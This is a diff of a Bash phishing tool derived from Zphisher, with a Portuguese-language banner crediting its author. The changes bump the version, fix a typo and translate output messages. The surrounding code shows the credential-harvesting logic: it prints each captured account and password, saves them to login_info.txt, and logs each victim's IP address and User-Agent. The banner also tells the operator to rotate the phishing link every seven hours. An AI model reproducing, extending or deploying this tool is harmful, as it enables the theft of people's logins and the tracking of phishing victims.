@@ -17,14 +17,14 @@ printf " \e[33;1m
 |  \            |      |           |         |       |           /  \  
 |   \           |      |           |         |       |          /    \ 
 |    \          |      |           |         |_______|         /      \ \e[0m\n"
-printf " \e[33;1m      |_|           \e[1;97m    Version 1.1      \e[0m\n"
+printf " \e[33;1m      |_|           \e[1;97m    Version 1.2      \e[0m\n"
 printf " \n"
 printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Ferramenta criada por HeroRicky_Games (https://www.youtube.com/herorickygames)
 Baseada na Zphisher \e[0m\n"
 printf "
 
 Essa ferramenta é flex, voce muda os arquvios na pasta WebCustomSite
-lembre=se que pode haver quedas na rede se compartilhada por muitos 
+lembre-se que pode haver quedas na rede se compartilhada por muitos 
 e lembre=se de trocar o link a cada 7 em 7 horas.
 
 "
@@ -229,7 +229,7 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
 cat websites/$server/usernames.txt >> websites/$server/login_info.txt
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Salvo:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
 rm -rf websites/$server/usernames.txt
@@ -259,7 +259,7 @@ printf "\n"
 while [ true ]; do
 if [[ -e "websites/$server/ip.txt" ]]; then
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Um novo acesso encontrado!\n"
 printf "\n"
 c_ip
 rm -rf websites/$server/ip.txt
@@ -279,9 +279,9 @@ touch websites/$server/login_info.txt
 ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m IP da pessoa quue acessou:\e[0m\e[1;96m %s\e[0m\n" $ip
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Salvo:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
 printf "\n"
 cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
 }
@@ -293,7 +293,7 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
 cat websites/$server/usernames.txt >> websites/$server/login_info.txt
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Salvo:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
 }
